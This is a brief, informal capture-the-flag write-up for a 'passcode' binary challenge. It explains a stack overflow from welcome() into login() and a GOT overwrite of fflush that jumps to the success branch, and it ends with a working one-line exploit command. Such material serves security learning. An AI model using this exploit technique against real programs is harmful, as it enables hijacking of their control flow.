so, apparently we can affect the contents of passcode1 in login() by a suitably long string in the previous welcome() function.

so we write 96 random chars ('A') first, then the latter four will be the content of passcode1.
however we cant control passcode2.

what we do is that we fill passcode1 with an arbitrary address, the contents at this address
will then be filled in with contents from the first scanf("%d", passcode); in source.

we chose to select the address of fflush GOT table entry to overwrite, and overwrite it with
the address of the correct branch of the if-statement that succeeds if passcodes would
have been checked correctly.

got-table address of fflush:

$ objdump -R passcode
...
0804a004 R_386_JUMP_SLOT   fflush@GLIBC_2.0
...


adress of correct branch (got from radare2):

0x080485e3
which is 134514147 as int


haxx:

(echo -e -n "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\x04\xa0\x04\x08\n134514147\n"; cat) | ./passcode
